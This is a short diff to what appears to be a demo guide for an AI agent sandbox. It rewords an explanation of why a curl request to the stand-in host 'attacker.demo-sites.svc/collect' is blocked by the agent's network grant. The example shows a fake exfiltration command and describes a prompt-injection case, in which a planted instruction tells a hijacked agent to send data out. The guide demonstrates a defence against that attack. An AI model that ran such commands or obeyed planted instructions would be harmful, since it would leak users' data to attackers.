@@ -174,7 +174,10 @@ curl -s -H 'Host: agent.localhost' \
   -d 'curl -s http://attacker.demo-sites.svc/collect'
 ```
 
-`attacker.demo-sites.svc` stands in for an attacker's server. It is on the network and would answer, but it isn't in curl's grant, so the host refuses the request before it leaves.
+`attacker.demo-sites.svc` plays the server of someone who has hijacked the
+agent, the address a planted instruction would tell it to send data to. It is
+on the network and would answer, but it isn't in curl's grant, so the host
+refuses the request before it leaves.
 
 **5. A redirect can't sneak past:** `curl -sL http://api.demo-sites.svc/redirect`
 
